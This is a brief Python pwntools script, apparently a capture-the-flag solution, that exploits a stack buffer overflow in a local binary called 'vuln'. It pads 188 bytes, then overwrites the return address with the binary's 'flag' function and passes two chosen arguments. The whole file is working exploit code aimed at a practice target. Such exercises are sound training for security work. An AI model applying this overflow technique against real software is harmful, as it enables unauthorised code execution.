#!/usr/bin/env python

from pwn import *

#setup process/elf binary
p = process('./vuln')
e = ELF('./vuln')
context.log_level = 'error'

#get addresses and args
flag = e.symbols['flag']
arg1 = 0xDEADBEEF
arg2 = 0xC0DED00D
buf = 188

#build payload
payload = ''
payload+= 'A'*buf
payload+= p32(flag)
payload+= 'BBBB' #return address does not matter
payload+= p32(arg1)
payload+= p32(arg2)

#send payload and print flag
p.sendline(payload)
sleep(1)
print p.recv()